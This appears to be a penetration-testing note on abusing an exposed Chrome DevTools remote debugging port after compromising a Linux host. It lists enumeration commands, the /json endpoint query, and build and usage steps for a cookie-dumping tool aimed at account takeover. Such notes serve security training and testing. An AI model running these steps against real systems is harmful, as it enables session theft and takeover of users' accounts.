---
Primary_category: "[[LINUX PRIVESC]]"
title: "CHROME DEVTOOLS ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Theory*

*Chrome/Chromium* may be exposed via *Chrome Devtools Protocol ( CDP )* when the binary is launched with options such as →

```bash
--remote-debugging-port=<PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> /opt/google/chrome/chrome --type=renderer --headless --remote-debugging-port=41829 --test-type=webdriver ...<SNIP>... --disable-features=PaintHolding
> ```
>

This usually occurs in automated environments e.g. *Selenium* running *Chrome* in headless mode to check several web application features

The problem arises when such application is launched with the mentioned *remote debug* option and it's exposed locally or externally

If so, an operator can interact with any open tab, inspect active sessions or extract sensitive data, such as *cookies* or login credentials

##### *Interesting Endpoints*

```bash
/json
/json/list
/json/version
```

---

#### *Local Enumeration*

##### *Listing Running Processes*

> ***pgrep***

```bash
pgrep --full --list-full 'chrome.*--remote-debug'
```

> ***ps***

```bash
ps -faux | grep -iA 3 --color -- 'chrome.*--remote-debug'
```

##### *Enumerating Listening Local TCP Ports*

> ***netstat***

```bash
netstat -vlntp
```

> ***ss***

```bash
ss -lntp
```

##### *Checking the Chrome Devtools Endpoint*

```bash
curl --silent --location --request GET 'http://localhost:<PORT>/json'
```

> [!TLDR]- *Expected Output*
>
> ```json
> [ {
>    "description": "",
>    "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:41829/devtools/page/0A7A568FE4057C770720D759B883A8A2",
>    "id": "0A7A568FE4057C770720D759B883A8A2",
>    "title": "500 Internal Server Error",
>    "type": "page",
>    "url": "http://<TARGET>/account/login",
>    "webSocketDebuggerUrl": "ws://localhost:41829/devtools/page/0A7A568FE4057C770720D759B883A8A2"
> } ]
> ```
>

---

#### *Exposed Remote Debugging Port*

> ***Chrome Devtools Protocol exposed through a Remote Debugging Port***

##### *Workflow*

Let's say we compromise a web application and gain code execution, then we establish a remote connection via a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]***

Once we break into the machine, we start enumerating the entire system. During this process, we list running processes in the target and see that there is a chrome instance running in headless mode with a *remote debugging port* accesible

So first, we start checking if the given port is accesible locally. If so, we continue by sending an *HTTP* request to the **`/json`** endpoint to gather some information about the *Chrome* instance

> ***Check [[#Checking the Chrome Devtools Endpoint|this]] out***

The key field is **`webSocketDebuggerURL`**, because it exposes the *WebSocket* endpoint used by the *Chrome Devtools Protocol* to interact with that specific browser tab

So, we can carry out all the mentioned actions, such as retrieve sensitive stored cookies, by accessing this websocket using the *CDP*

To do this, we can use tools such as **`chrome://inspect`**, devtools clients or offensive tooling, such as ***[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)***. All of them connect to the *WebSocket* listed on the **`/json`** endpoint and send *CDP* commands

##### *Requirements*

- ***Chrome/Chromium running on the Target Machine***

- ***The Debug Option used during its startup***

> ***e.g. `--remote-debugging-port=<PORT>`***

- ***The Debug Port must be accesible***

##### *Abuse*

- **`chrome://inspect`**

Simply open *Chrome/Chromium* and enter the *Internal URL* above

Then, we can add a new network target by selecting the *Configure* option

![[CHROME DEVTOOLS ABUSE-20260705190054157.webp|400]]

> ***Zoom in***

Next, enter the *IP Address* and *TCP Port*

![[CHROME DEVTOOLS ABUSE-20260705190511384.webp|200]]

> ***Zoom in***

Once we save the options above, we will see an avaiable remote target

![[CHROME DEVTOOLS ABUSE-20260705203946636.webp|350]]

> ***Zoom in***

Once we inspect it, we will be able to access the given browser session and retrieve all the necessary information

- ***[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)***

To automate all this process, as stated, we can leverage tools like this one

***Setup***

```bash
go main go
go mod init github.com/slyd0g/WhiteChocolateMacademiaNut
go mod tidy
go build -ldflags '-s -w' -o WhiteChocolateMacademiaNut
```

***Usage***

> ***Cookie Retrieval***

```bash
./WhiteChocolateMacademiaNut --port <DEBUG_PORT> --dump cookies
```

After that, we can carry out an account takeover on any website where the user is logged in